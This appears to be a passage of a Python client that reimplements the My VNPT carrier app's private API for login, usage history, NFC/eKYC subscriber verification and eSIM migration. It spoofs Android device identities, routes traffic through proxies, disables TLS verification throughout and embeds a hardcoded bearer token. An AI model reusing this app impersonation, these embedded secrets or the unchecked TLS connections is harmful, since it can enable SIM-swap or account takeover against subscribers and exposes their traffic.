        http.proxies.update(proxy_dict)
    init_headers = {
        'Authorization': bearer, 'Content-Type': 'application/json; charset=UTF-8',
        'Cache-Control': 'no-cache', 'Channel-Code': 'APP', 'Device-Info': device_info,
        'Language': 'vi_VN', 'partnerCode': 'MYVNPT', 'User-Agent': 'okhttp/4.7.2',
        'X-Secret-Key': init_secret, 'X-Signature': init_sig,
    }
    log_cb('[MYVNPT] initDevice...')
    try:
        init_response = http.post(MYVNPT_BASE + '/tel_service/device/initDevice',
                                  headers=init_headers, json={'requestData': init_data},
                                  timeout=60, verify=False)
        init_outer = init_response.json()
    except Exception as exc:
        raise EsimRegistrationError(f'initDevice: {exc}') from exc
    if init_response.status_code != 200 or not init_outer.get('data'):
        raise EsimRegistrationError(
            f"initDevice: HTTP {init_response.status_code} - {init_outer.get('message', '?')}")
    try:
        new_server_key = json.loads(adec(init_outer['data'])).get('serverPublicKey', '')
    except Exception as exc:
        raise EsimRegistrationError(f'initDevice response decrypt failed: {exc}') from exc
    if not new_server_key:
        raise EsimRegistrationError('initDevice did not return serverPublicKey')

    if otp:
        login_body = {
            'device_info': model,
            'fcm_registration_token': fcm_token,
            'mode': 'otp',
            'msisdn': phone_norm,
            'otp': str(otp).strip(),
        }
        login_mode = 'OTP'
    else:
        password_hash = _hashlib.md5(
            str(password).encode('utf-8')).hexdigest().upper()
        login_body = {
            'device_info': model,
            'fcm_registration_token': fcm_token,
            'mode': 'password',
            'msisdn': phone_norm,
            'password': password_hash,
        }
        login_mode = 'password'
    log_cb(f'[MYVNPT] authen_msisdn ({login_mode})...')
    try:
        login_response = http.post(
            MYVNPT_BASE + '/mapi_v2/services/authen_msisdn',
            headers={'Authorization': bearer, 'Content-Type': 'application/json; charset=UTF-8',
                     'Device-Info': device_info, 'Language': 'vi_VN', 'User-Agent': 'okhttp/4.7.2'},
            json=login_body,
            timeout=60, verify=False)
        login_data = login_response.json()
    except Exception as exc:
        raise EsimRegistrationError(f'authen_msisdn: {exc}') from exc
    error_code = str(login_data.get('error_code', '?'))
    session_id = login_data.get('session', '')
    if login_response.status_code != 200 or error_code != '0' or not session_id:
        raise EsimRegistrationError(
            f"authen_msisdn: HTTP {login_response.status_code}, ec={error_code}, "
            f"msg={login_data.get('message', '?')}")

    data = (_load_session_data() or {}) if inherit_default else {}
    data.update({
        'rsa_key_private': aenc(private_b64),
        'server_public_key': aenc(new_server_key),
        'login_session': session_id,
        'API_SESSION_ID': session_id,
        'phone_number_login': login_data.get('msisdn', phone_norm),
        'API_MSISDN_LOGIN': login_data.get('msisdn', phone_norm),
        'KEY_ENCRYPT_AES': AES_MASTER_KEY,
        'BEARER_TOKEN': bearer,
        'DEVICE_INFO': device_info,
        'DEVICE_MODEL': model,
        'FCM_TOKEN': fcm_token,
        'MAC_ADDRESS': mac_address,
        '_saved_at': __import__('time').strftime('%Y-%m-%d %H:%M:%S'),
    })
    output_path = session_file or DEVICE_SESSION_JSON
    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
    with open(output_path, 'w', encoding='utf-8') as session_handle:
        json.dump(data, session_handle, ensure_ascii=False, indent=2)
    if (mirror_default and
            os.path.abspath(output_path) != os.path.abspath(DEVICE_SESSION_JSON)):
        with open(DEVICE_SESSION_JSON, 'w', encoding='utf-8') as session_handle:
            json.dump(data, session_handle, ensure_ascii=False, indent=2)
    log_cb(f'[MYVNPT] Login OK: {phone_norm}; session saved')
    return data


_UPDATE_INFO_LOGIN_PROFILES = {}


def _update_info_device_profile():
    """Use the 3.4.09 Android identity required by the analysed source."""
    profile = _random_device_profile()
    profile['model'] = '25053RT47C'
    profile['android_ver'] = '16'
    profile['di'] = (
        f'{profile["uuid"]}|{profile["uuid"]}|unknown|Android||'
        f'3.4.09.Prd|{profile["model"]}|{profile["android_ver"]}|')
    return profile


def request_myvnpt_login_otp(phone, log_cb=print):
    """Request the first OTP: the one used to sign in to My VNPT."""
    phone_norm = _esim_normalize_msisdn(phone)
    if not phone_norm:
        raise EsimRegistrationError('Nhập số My VNPT trước khi yêu cầu OTP')
    profile = _update_info_device_profile()
    _UPDATE_INFO_LOGIN_PROFILES[phone_norm] = profile
    bearer = 'Bearer ' + (
        'a60bd62fed0cf1076e93af76114f196bd9c5a48155b2bac88afe15c49595414b')
    headers = {
        'Authorization': bearer,
        'Content-Type': 'application/json; charset=UTF-8',
        'Device-Info': profile['di'],
        'Language': 'vi_VN',
        'User-Agent': 'okhttp/4.7.2',
    }
    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(
            refresh_if_missing=True)
    except Exception:
        pass
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
        http.proxies.update(proxy_dict)
    log_cb(f'[UPDATE_INFO] Yêu cầu OTP đăng nhập cho {phone_norm}...')
    try:
        response = http.post(
            MYVNPT_BASE + '/mapi_v2/services/authen_msisdn',
            headers=headers,
            json={
                'device_info': profile['model'],
                'fcm_registration_token': profile['fcm_token'],
                'mode': 'request_otp',
                'msisdn': phone_norm,
            },
            timeout=60,
            verify=False,
        )
        payload = response.json()
    except Exception as exc:
        raise EsimRegistrationError(
            f'Yêu cầu OTP đăng nhập thất bại: {exc}') from exc
    code = str(payload.get('error_code', payload.get('errorCode', '?')))
    if response.status_code != 200 or code not in ('0', '00'):
        raise EsimRegistrationError(
            f"Yêu cầu OTP đăng nhập: HTTP {response.status_code}, "
            f"ec={code}, msg={payload.get('message', '?')}")
    log_cb('[UPDATE_INFO] OTP đăng nhập đã được gửi.')
    return payload


def _usage_history_http_session(session_data):
    """Create a separate HTTP client for the subscriber's history session."""
    msisdn = _esim_normalize_msisdn(
        session_data.get('API_MSISDN_LOGIN') or
        session_data.get('phone_number_login'))
    session_id = str(session_data.get('API_SESSION_ID') or
                     session_data.get('login_session') or '').strip()
    bearer = str(session_data.get('BEARER_TOKEN') or '').strip()
    device_info = str(session_data.get('DEVICE_INFO') or '').strip()
    if not re.fullmatch(r'84\d{9}', msisdn) or not all(
            (session_id, bearer, device_info)):
        raise UsageHistoryError('Phiên My VNPT không hợp lệ; hãy đăng nhập lại.')
    if not bearer.lower().startswith('bearer '):
        bearer = 'Bearer ' + bearer
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    try:
        proxies = proxy_manager.current_requests_proxies(
            refresh_if_missing=True)
        if proxies:
            http.proxies.update(proxies)
    except Exception as exc:
        if proxy_manager.is_required():
            http.close()
            raise UsageHistoryError(f'Không kết nối được proxy: {exc}') from exc
    headers = {
        'Authorization': bearer,
        'Content-Type': 'application/json; charset=UTF-8',
        'Cache-Control': 'no-cache',
        'Device-Info': device_info,
        'Language': 'vi_VN',
        'User-Agent': 'okhttp/4.7.2',
    }
    return http, headers, msisdn, session_id


def _usage_history_post(session_data, endpoint, body):
    http, headers, _msisdn, _session = _usage_history_http_session(session_data)
    try:
        response = http.post(
            MYVNPT_BASE + endpoint, headers=headers, json=body,
            timeout=(10, 45), verify=False)
        try:
            payload = response.json()
        except ValueError as exc:
            raise UsageHistoryError(
                f'My VNPT trả phản hồi không phải JSON (HTTP {response.status_code}).'
            ) from exc
        if not isinstance(payload, dict):
            raise UsageHistoryError('My VNPT trả dữ liệu sai định dạng.')
        return payload, response.status_code
    except requests.RequestException as exc:
        raise UsageHistoryError(f'Không kết nối được My VNPT: {exc}') from exc
    finally:
        http.close()


def fetch_myvnpt_usage_history(session_data, year, month, otp=''):
    msisdn = _esim_normalize_msisdn(
        session_data.get('API_MSISDN_LOGIN') or
        session_data.get('phone_number_login'))
    session_id = session_data.get('API_SESSION_ID') or session_data.get('login_session')
    body = history_request(msisdn, session_id, year, month, otp)
    payload, status = _usage_history_post(session_data, HISTORY_ENDPOINT, body)
    return parse_history_response(payload, status)


def send_myvnpt_usage_history_otp(session_data):
    msisdn = _esim_normalize_msisdn(
        session_data.get('API_MSISDN_LOGIN') or
        session_data.get('phone_number_login'))
    payload, status = _usage_history_post(
        session_data, HISTORY_OTP_ENDPOINT,
        {'msisdn': msisdn, 'otp_service': HISTORY_OTP_SERVICE})
    code = str(payload.get('error_code', payload.get('errorCode', ''))).strip()
    if status != 200 or code not in ('0', '00', '200', '200.0'):
        raise UsageHistoryError(
            f'Không gửi được OTP lịch sử (mã {code or "?"}): '
            f'{payload.get("message") or "My VNPT từ chối yêu cầu."}')
    return payload


def _update_info_load_config(config):
    if isinstance(config, str):
        with open(config, 'r', encoding='utf-8') as config_handle:
            config = json.load(config_handle)
    if not isinstance(config, dict):
        raise EsimRegistrationError('Cấu hình UPDATE_INFO phải là JSON object')
    return config.get('update_info', config)


def _update_info_session_context(config, session_file=None):
    """Load a logged-in My VNPT context for subscriber verification."""
    cfg = _update_info_load_config(config)
    session_path = (session_file or cfg.get('session_file') or
                    UPDATE_INFO_SESSION_JSON)
    if not os.path.isfile(session_path):
        raise EsimRegistrationError(
            'Chưa đăng nhập My VNPT trong tab Xác thực thông tin thuê bao.')
    try:
        with open(session_path, 'r', encoding='utf-8') as session_handle:
            session_data = json.load(session_handle)
    except Exception as exc:
        raise EsimRegistrationError(
            f'Không đọc được phiên đăng nhập My VNPT: {exc}') from exc
    master_key = session_data.get('KEY_ENCRYPT_AES') or AES_MASTER_KEY
    try:
        private_key = _esim_decrypt_with_master(
            session_data.get('rsa_key_private', ''), master_key)
        server_public_key = _esim_decrypt_with_master(
            session_data.get('server_public_key', ''), master_key)
    except Exception as exc:
        raise EsimRegistrationError(
            f'Không giải mã được phiên My VNPT: {exc}') from exc
    session_id = str(
        session_data.get('API_SESSION_ID') or
        session_data.get('login_session') or '').strip()
    msisdn = _esim_normalize_msisdn(
        session_data.get('API_MSISDN_LOGIN') or
        session_data.get('phone_number_login') or cfg.get('msisdn'))
    bearer = str(session_data.get('BEARER_TOKEN') or '').strip()
    if bearer and not bearer.lower().startswith('bearer '):
        bearer = 'Bearer ' + bearer
    device_info = str(session_data.get('DEVICE_INFO') or '').strip()
    if not session_id or not msisdn:
        raise EsimRegistrationError(
            'Phiên My VNPT thiếu session hoặc số thuê bao đăng nhập.')
    if not bearer or not device_info or not private_key or not server_public_key:
        raise EsimRegistrationError(
            'Phiên My VNPT thiếu device/RSA context; hãy đăng nhập lại trong tab.')
    return {
        'cfg': cfg,
        'session_file': session_path,
        'session_data': session_data,
        'session': session_id,
        'msisdn': msisdn,
        'bearer': bearer,
        'device_info': device_info,
        'private_key': private_key,
        'server_public_key': server_public_key,
    }


def _update_info_http_context(context):
    """HTTP helpers matching My VNPT UPDATE_INFO plain/encrypted calls."""
    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(
            refresh_if_missing=True)
    except Exception:
        pass
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
        http.proxies.update(proxy_dict)

    def base_headers(content_type=True):
        headers = {
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip',
            'Cache-Control': 'no-cache',
            'Connection': 'Keep-Alive',
            'Device-Info': context['device_info'],
            'Language': 'vi_VN',
            'Authorization': context['bearer'],
            'User-Agent': 'okhttp/4.7.2',
        }
        if content_type:
            headers['Content-Type'] = 'application/json; charset=UTF-8'
        return headers

    def validate(response, payload, endpoint):
        if response.status_code != 200:
            message = (_esim_deep_find(payload, 'message', 'msg') or
                       response.text[:300])
            raise EsimRegistrationError(
                f'{endpoint}: HTTP {response.status_code} - {message}')
        code = _esim_error_code(payload)
        if code not in ('', '0', '00', '200', 'success', 'true'):
            message = (_esim_deep_find(payload, 'message', 'msg') or
                       'server rejected request')
            raise EsimRegistrationError(f'{endpoint}: {code} - {message}')
        return payload

    def post_plain(endpoint, body, log_cb=print):
        log_cb(f'[UPDATE_INFO] POST {endpoint}')
        try:
            response = http.post(
                MYVNPT_BASE + endpoint, headers=base_headers(), json=body,
                timeout=90, verify=False)
            payload = response.json()
        except Exception as exc:
            raise EsimRegistrationError(f'{endpoint}: {exc}') from exc
        return validate(response, payload, endpoint)

    def post_encrypted(endpoint, body, log_cb=print):
        aes_key = ''.join(secrets.choice(
            string.ascii_letters + string.digits) for _ in range(32))
        request_data = aes_encrypt(
            json.dumps(body, ensure_ascii=False, separators=(',', ':')),
            aes_key)
        headers = base_headers()
        headers['Channel-Code'] = 'APP'
        headers['partnerCode'] = 'MYVNPT'
        headers['X-Secret-Key'] = rsa_encrypt_no_padding(
            aes_key, context['server_public_key'])
        headers['X-Signature'] = sign_sha256_rsa(
            request_data, context['private_key'])
        log_cb(f'[UPDATE_INFO] POST {endpoint} (encrypted v2)')
        try:
            response = http.post(
                MYVNPT_BASE + endpoint, headers=headers,
                json={'requestData': request_data}, timeout=120, verify=False)
            outer = response.json()
        except Exception as exc:
            raise EsimRegistrationError(f'{endpoint}: {exc}') from exc
        inner = outer
        encrypted_data = outer.get('data') if isinstance(outer, dict) else None
        if isinstance(encrypted_data, str) and encrypted_data:
            try:
                inner = json.loads(aes_decrypt_gen(encrypted_data, aes_key))
            except Exception as exc:
                raise EsimRegistrationError(
                    f'{endpoint}: không giải mã được response ({exc})') from exc
        validate(response, inner if isinstance(inner, dict) else outer,
                 endpoint)
        return {'outer': outer, 'data': inner}

    return http, base_headers, post_plain, post_encrypted


def run_update_info_prepare(config, session_file=None, log_cb=print):
    """Login and send the second OTP used for subscriber identification."""
    cfg = _update_info_load_config(config)
    phone = cfg.get('phone') or cfg.get('msisdn') or ''
    password = cfg.get('password') or ''
    login_otp = cfg.get('login_otp') or ''
    if not password and not login_otp:
        raise EsimRegistrationError(
            'Nhập mật khẩu hoặc OTP đăng nhập My VNPT.')
    target_session_file = session_file or UPDATE_INFO_SESSION_JSON
    login_profile = _UPDATE_INFO_LOGIN_PROFILES.pop(
        _esim_normalize_msisdn(phone), None) or _update_info_device_profile()
    login_myvnpt_session(
        phone, password=password, otp=login_otp,
        session_file=target_session_file, log_cb=log_cb,
        mirror_default=False, device_profile=login_profile)
    context = _update_info_session_context(
        cfg, session_file=target_session_file)
    _http, _headers, post_plain, post_encrypted = \
        _update_info_http_context(context)
    request_id = str(uuid.uuid4())
    progress = post_encrypted(
        '/tel_service/update_info/getRequestInProgress',
        {
            'msisdn': context['msisdn'],
            'session': context['session'],
            'requestId': request_id,
        },
        log_cb=log_cb,
    )
    status = post_plain(
        '/tel_service/mobile/checkUpdateInfoStatus',
        {'msisdn': context['msisdn'], 'session': context['session']},
        log_cb=log_cb,
    )
    identification_otp = post_plain(
        '/mapi_v2/services/otp_send',
        {
            'msisdn': context['msisdn'],
            'otp_service': 'myvnpt_identification',
        },
        log_cb=log_cb,
    )
    log_cb('[UPDATE_INFO] Đã gửi OTP xác thực thông tin thuê bao.')
    return {
        'ok': True,
        'msisdn': context['msisdn'],
        'request_id': request_id,
        'request_in_progress': progress.get('data'),
        'update_status': status,
        'otp_send': identification_otp,
    }


def run_update_info_confirm_otp(config, session_file=None, log_cb=print):
    """Validate identification OTP, load auth methods and NFC challenge."""
    cfg = _update_info_load_config(config)
    otp = str(cfg.get('identification_otp') or '').strip()
    if not otp:
        raise EsimRegistrationError('Nhập OTP xác thực thông tin thuê bao.')
    context = _update_info_session_context(
        cfg, session_file=session_file or UPDATE_INFO_SESSION_JSON)
    _http, _headers, post_plain, post_encrypted = \
        _update_info_http_context(context)
    identity = post_plain(
        '/mapi_v2/services/myvnpt_identification_check_otp',
        {
            'otp': otp,
            'type': '2',
            'msisdn': context['msisdn'],
            'session': context['session'],
        },
        log_cb=log_cb,
    )
    active_token = str(_esim_deep_find(
        identity, 'token_update_info', 'tokenUpdateInfo') or '')
    if not active_token:
        raise EsimRegistrationError(
            'OTP hợp lệ nhưng response thiếu token_update_info.')
    auth_methods = post_plain(
        '/tel_service/update_info/getAuthenMethods',
        {
            'requestId': str(uuid.uuid4()),
            'session': context['session'],
            'feature': 'UPDATE_INFO',
            'msisdn': context['msisdn'],
        },
        log_cb=log_cb,
    )
    methods = _esim_deep_find(auth_methods, 'result') or []
    method_codes = [
        str(item.get('authenCode') or '')
        for item in methods if isinstance(item, dict)
    ]
    selected_method = str(cfg.get('authen_method') or 'NFC').upper()
    if selected_method not in method_codes:
        raise EsimRegistrationError(
            f'Phương thức {selected_method} không có trong auth methods '
            f'UPDATE_INFO hiện tại: {", ".join(method_codes) or "(trống)"}')
    challenge_request_id = str(uuid.uuid4())
    secure_code = hashlib.sha256(
        f'{context["msisdn"]}|{challenge_request_id}|{SECRET_AUTHEN}'.encode(
            'utf-8')).hexdigest()
    challenge_response = post_encrypted(
        '/tel_service/active_sim/v2/getChallengeCodeSdkEkyc',
        {
            'session': context['session'],
            'msisdn': context['msisdn'],
            'requestId': challenge_request_id,
            'secureCode': secure_code,
            'feature': 'UPDATE_INFO',
        },
        log_cb=log_cb,
    )
    challenge_data = challenge_response.get('data')
    challenge_code = str(_esim_deep_find(
        challenge_data, 'challengeCode', 'challenge_code') or '')
    if not challenge_code:
        raise EsimRegistrationError(
            'getChallengeCodeSdkEkyc không trả về challengeCode.')
    log_cb(
        f'[UPDATE_INFO] OTP đúng; đã chọn {selected_method} và nhận challenge.')
    return {
        'ok': True,
        'msisdn': context['msisdn'],
        'session': context['session'],
        'active_token': active_token,
        'authen_method': selected_method,
        'auth_methods': methods,
        'challenge_code': challenge_code,
        'challenge': challenge_data,
        'mobile_info': _esim_deep_find(identity, 'mobile_info', 'mobileInfo'),
    }


def _update_info_read_nfc_context(path):
    if not path or not os.path.isfile(path):
        raise EsimRegistrationError(
            'Chọn file JSON kết quả NFC lấy từ SDK My VNPT trên Android.')
    try:
        with open(path, 'r', encoding='utf-8-sig') as context_handle:
            data = json.load(context_handle)
    except Exception as exc:
        raise EsimRegistrationError(f'Không đọc được JSON NFC: {exc}') from exc
    if not isinstance(data, dict):
        raise EsimRegistrationError('JSON NFC phải là một object.')
    return data.get('update_info', data)


def _update_info_pick(context, *names, default=''):
    value = _esim_deep_find(context, *names)
    return default if value in (None, [], {}) else value


def run_update_info_submit_nfc(config, runtime, session_file=None,
                               log_cb=print):
    """Submit the source-faithful NFC/portrait multipart verification.

    Android's VnptScanNFCActivity performs the physical chip read.  This
    function consumes that SDK result instead of inventing NFC data from card
    photos, then posts the exact Ver4 multipart shape used by the app.
    """
    cfg = _update_info_load_config(config)
    if not isinstance(runtime, dict) or not runtime.get('challenge_code'):
        raise EsimRegistrationError(
            'Chưa xác nhận OTP/chưa có challenge UPDATE_INFO.')
    nfc = _update_info_read_nfc_context(cfg.get('nfc_context_file'))
    paths = {
        'frontImage': str(cfg.get('front_image') or '').strip(),
        'backImage': str(cfg.get('back_image') or '').strip(),
        'portraitImage': str(cfg.get('portrait_image') or '').strip(),
    }
    for label, path in paths.items():
        if not path or not os.path.isfile(path) or os.path.getsize(path) <= 128:
            raise EsimRegistrationError(f'Thiếu file {label} hợp lệ: {path}')
    context = _update_info_session_context(
        cfg, session_file=session_file or UPDATE_INFO_SESSION_JSON)
    http, base_headers, post_plain, _post_encrypted = \
        _update_info_http_context(context)

    nfc_model = _update_info_pick(
        nfc, 'data_nfc_result', 'dataNfcResult', default={})
    if isinstance(nfc_model, str):
        try:
            nfc_model = json.loads(nfc_model)
        except Exception:
            nfc_model = {}
    if not isinstance(nfc_model, dict):
        nfc_model = {}
    credential = nfc_model.get('object') if isinstance(
        nfc_model.get('object'), dict) else {}
    if not credential:
        possible = _update_info_pick(nfc, 'credentialInfo', 'credential_info',
                                     default={})
        credential = possible if isinstance(possible, dict) else {}

    def artifact(*names):
        return str(_update_info_pick(nfc, *names, default='') or '')

    verify_payload = nfc.get('verifyPayload') or nfc.get('verify_payload')
    if isinstance(verify_payload, dict):
        payload = dict(verify_payload)
    else:
        gender_text = str(credential.get('gender') or '').strip().lower()
        gender = 'male' if gender_text in ('nam', 'male', 'm') else 'female'
        payload = {
            'session': context['session'],
            'msisdn': context['msisdn'],
            'ekyc_data': artifact('ekycData', 'ekyc_data'),
            'ekyc_datasign': artifact('ekycDatasign', 'ekyc_datasign'),
            'ekyc_face': artifact('ekycFace', 'ekyc_face'),
            'ekyc_facesign': artifact('ekycFacesign', 'ekyc_facesign'),
            'liveness': artifact('liveness'),
            'liveness_sign': artifact('liveness_sign', 'livenessSign'),
            'liveness_font': artifact('liveness_font', 'livenessFront'),
            'liveness_font_sign': artifact(
                'liveness_font_sign', 'livenessFrontSign'),
            'liveness_back': artifact('liveness_back', 'livenessBack'),
            'liveness_back_sign': artifact(
                'liveness_back_sign', 'livenessBackSign'),
            'masked': artifact('masked'),
            'masked_sign': artifact('masked_sign', 'maskedSign'),
            're_gender': '',
            're_name': str(credential.get('name') or ''),
            're_birthday': '',
            'ekyc_type': '5',
            'issue_place': str(credential.get('issue_place') or ''),
            'gender': gender,
            'province_code': artifact('province_code', 'provinceCode'),
            'ekyc_face_logid': artifact(
                'ekyc_face_logid', 'ekycFaceLogId'),
            'ekyc_data_logid': artifact(
                'ekyc_data_logid', 'ekycDataLogId', 'logIdEkycData'),
            'ekyc_verify_type': '5',
            'type': '5',
            'issue_date': str(credential.get('issue_date') or ''),
            'challengeCode': runtime['challenge_code'],
            'activeToken': runtime['active_token'],
            'log_id_live_ness_front_card': artifact(
                'log_id_live_ness_front_card', 'livenessCardFrontLogId'),
            'log_id_live_ness_back_card': artifact(
                'log_id_live_ness_back_card', 'livenessCardBackLogId'),
            'log_id_live_ness_face': artifact(
                'log_id_live_ness_face', 'liveNessFaceLogId'),
            'log_id_mask_face': artifact(
                'log_id_mask_face', 'maskedFaceLogId'),
            'id_province_name': artifact(
                'id_province_name', 'idProvinceName'),
            'authenMethod': 'NFC',
            'hashImageAvatarNfc': artifact(
                'hashImageAvatarNfc', 'hash_image_avatar_nfc'),
            'dataNfcResultSign': str(
                nfc_model.get('dataSign') or artifact(
                    'dataNfcResultSign', 'data_nfc_result_sign')),
            'dataNfcResultBase64': str(
                nfc_model.get('dataBase64') or artifact(
                    'dataNfcResultBase64', 'data_nfc_result_base64')),
            'logIdNfc': str(
                nfc_model.get('logID') or nfc_model.get('logId') or artifact(
                    'logIdNfc', 'log_id_nfc')),
            'channel': 'android',
        }
    # Runtime values are authoritative and must never be reused from an old
    # capture file.
    payload.update({
        'session': context['session'],
        'msisdn': context['msisdn'],
        'challengeCode': runtime['challenge_code'],
        'activeToken': runtime['active_token'],
        'authenMethod': 'NFC',
        'ekyc_verify_type': '5',
        'type': '5',
        'channel': 'android',
    })
    data_groups = _update_info_pick(
        nfc, 'dataGroupsResult', 'data_groups_result', default='')
    if isinstance(data_groups, (dict, list)):
        data_groups = json.dumps(
            data_groups, ensure_ascii=False, separators=(',', ':'))
    required_nfc = {
        'dataNfcResultBase64': payload.get('dataNfcResultBase64'),
        'dataNfcResultSign': payload.get('dataNfcResultSign'),
        'logIdNfc': payload.get('logIdNfc'),
        'hashImageAvatarNfc': payload.get('hashImageAvatarNfc'),
        'dataGroupsResult': data_groups,
    }
    missing = [key for key, value in required_nfc.items() if not value]
    if missing:
        raise EsimRegistrationError(
            'JSON NFC thiếu dữ liệu SDK bắt buộc: ' + ', '.join(missing))

    log_cb('[UPDATE_INFO] POST /mapi_v2/services/myvnpt_list_gt_noicap')
    card_id = str(credential.get('id') or credential.get('citizen_id') or '')
    issue_places = None
    if card_id:
        issue_places = post_plain(
            '/mapi_v2/services/myvnpt_list_gt_noicap',
            {'type': '45', 'idCard': card_id}, log_cb=log_cb)

    handles = []
    try:
        files = {
            'json': (None, json.dumps(
                payload, ensure_ascii=False, separators=(',', ':')),
                     'text/plain'),
            'dataGroupsResult': (None, str(data_groups), 'text/plain'),
        }
        for part_name, path in paths.items():
            handle = open(path, 'rb')
            handles.append(handle)
            files[part_name] = (
                os.path.basename(path), handle, 'image/jpg')
        log_cb('[UPDATE_INFO] POST /tel_service/update_info/ekycVerifyVer4 '
               '(multipart NFC)')
        response = http.post(
            MYVNPT_BASE + '/tel_service/update_info/ekycVerifyVer4',
            headers=base_headers(content_type=False), files=files,
            timeout=180, verify=False)
        try:
            result = response.json()
        except Exception:
            result = {'raw': response.text[:1000]}
    except Exception as exc:
        raise EsimRegistrationError(f'ekycVerifyVer4: {exc}') from exc
    finally:
        for handle in handles:
            try:
                handle.close()
            except Exception:
                pass
    if response.status_code != 200 or not _esim_is_success(result):
        code = _esim_error_code(result) or response.status_code
        message = _esim_deep_find(result, 'message', 'msg') or 'server rejected request'
        raise EsimRegistrationError(
            f'ekycVerifyVer4: {code} - {message}')
    log_cb('[UPDATE_INFO] Xác thực thông tin thuê bao thành công.')
    return {
        'ok': True,
        'status': 'subscriber_info_verified',
        'msisdn': context['msisdn'],
        'issue_places': issue_places,
        'result': result,
    }


def _esim_load_state(cfg):
    """Load app state produced by the preceding My VNPT/eKYC steps.

    The phone UI only asks for the backup number and email.  The selected
    MSISDN, session, and list of lines are carried by the app in memory.  A
    desktop run can persist that state in ``context_file`` (or the default
    history/esim_context.json) without exposing those fields as user inputs.
    """
    state = {}
    context_file = cfg.get('context_file') or os.path.join(HISTORY_DIR, 'esim_context.json')
    if context_file and not os.path.isabs(str(context_file)):
        context_file = os.path.join(BASE_DIR, str(context_file))
    if context_file and os.path.exists(str(context_file)):
        try:
            with open(str(context_file), 'r', encoding='utf-8') as context_handle:
                loaded = json.load(context_handle)
            if isinstance(loaded, dict):
                state.update(loaded.get('esim', loaded))
        except Exception as exc:
            raise EsimRegistrationError(f'cannot read eSIM context file: {exc}') from exc
    if isinstance(cfg.get('context'), dict):
        state.update(cfg['context'])
    # Explicit config values win over cached state.  This also lets callers
    # pass only backup_phone_number/email while all other values come from the
    # context file.
    state.update({key: value for key, value in cfg.items()
                  if key not in ('context', 'context_file')})
    return state


def run_esim_change_request(config, session_file=None, log_cb=print):
    """Create the My VNPT eSIM *change/migration* request.

    This is the flow represented by ``Uiv3EsimMigrateStep1ViewModel`` in the
    APK.  Its only customer-entered fields are ``backupPhoneNumber`` and
    ``email``.  The logged-in MSISDN, selected line list and session are
    internal app state; they are read from ``device_session.json`` and the
    optional ``esim_context.json`` file.
    """
    cfg = _esim_load_state(_esim_load_config(config))
    session_path = session_file or cfg.get('session_file') or DEVICE_SESSION_JSON
    requested_login_msisdn = _esim_normalize_msisdn(
        cfg.get('login_msisdn') or cfg.get('msisdn') or cfg.get('target_msisdn'))
    login_password = cfg.get('login_password') or cfg.get('password') or ''
    if login_password and requested_login_msisdn:
        current_phone = ''
        if os.path.exists(session_path):
            try:
                with open(session_path, 'r', encoding='utf-8') as current_handle:
                    current_phone = _esim_normalize_msisdn(
                        json.load(current_handle).get('phone_number_login'))
            except Exception:
                current_phone = ''
        if current_phone != requested_login_msisdn:
            login_myvnpt_session(requested_login_msisdn, login_password,
                                 session_file=session_path, log_cb=log_cb)
    if not os.path.exists(session_path):
        raise EsimRegistrationError(f'session file not found: {session_path}')
    with open(session_path, 'r', encoding='utf-8') as session_handle:
        session_data = json.load(session_handle)

    master_key = session_data.get('KEY_ENCRYPT_AES') or AES_MASTER_KEY
    try:
        private_key = _esim_decrypt_with_master(session_data.get('rsa_key_private', ''), master_key)
        server_public_key = _esim_decrypt_with_master(session_data.get('server_public_key', ''), master_key)
    except Exception as exc:
        raise EsimRegistrationError(f'cannot decrypt device session: {exc}') from exc
    if not private_key or not server_public_key:
        raise EsimRegistrationError('device_session.json lacks rsa_key_private/server_public_key')

    session_id = session_data.get('login_session') or session_data.get('API_SESSION_ID') or cfg.get('session', '')
    bearer = session_data.get('BEARER_TOKEN') or session_data.get('Authorization') or cfg.get('authorization', '')
    if bearer and not str(bearer).lower().startswith('bearer '):
        bearer = 'Bearer ' + str(bearer)
    device_info = session_data.get('DEVICE_INFO') or session_data.get('Device-Info') or DEVICE_INFO
    mac_address = session_data.get('MAC_ADDRESS') or session_data.get('mac-address') or MAC_ADDRESS
    if not session_id or not bearer or not device_info:
        raise EsimRegistrationError('session, bearer and device info are required')

    login_msisdn = _esim_normalize_msisdn(
        cfg.get('login_msisdn') or cfg.get('msisdn') or session_data.get('phone_number_login'))
    if not login_msisdn:
        raise EsimRegistrationError('logged-in MSISDN is missing from session/context')
    backup_phone = _esim_normalize_msisdn(
        cfg.get('backup_phone_number') or cfg.get('backupPhoneNumber') or cfg.get('backup_phone'))
    email = str(cfg.get('email') or '').strip()
    if not backup_phone:
        raise EsimRegistrationError('backup_phone_number is required')
    if not email:
        raise EsimRegistrationError('email is required')

    raw_list = (cfg.get('list_phone_number') or cfg.get('listPhoneNumber') or
                cfg.get('phone_numbers') or cfg.get('listPhoneNumberSelected'))
    if isinstance(raw_list, str):
        list_phone_number = [_esim_normalize_msisdn(item) for item in raw_list.split(',') if item.strip()]
    elif isinstance(raw_list, (list, tuple)):
        list_phone_number = [_esim_normalize_msisdn(item) for item in raw_list if str(item).strip()]
    else:
        list_phone_number = []
    # The app normally supplies the selected line list.  For a single-line
    # account, the logged-in line is the same default and needs no extra input.
    if not list_phone_number:
        list_phone_number = [login_msisdn]

    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(refresh_if_missing=True)
    except Exception:
        proxy_dict = None
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
        http.proxies.update(proxy_dict)

    def base_headers():
        return {
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept': 'application/json',
            'Cache-Control': 'no-cache',
            'Channel-Code': 'APP',
            'Device-Info': device_info,
            'Language': 'vi_VN',
            'Authorization': bearer,
            'partnerCode': 'MYVNPT',
            'User-Agent': 'okhttp/4.7.2',
            'mac-address': mac_address,
        }

    request_id = str(cfg.get('request_id') or uuid.uuid4())
    secure_code = hashlib.sha256(
        f'{login_msisdn}|{request_id}|{SECRET_AUTHEN}'.encode('utf-8')).hexdigest()
    body = {
        'msisdn': login_msisdn,
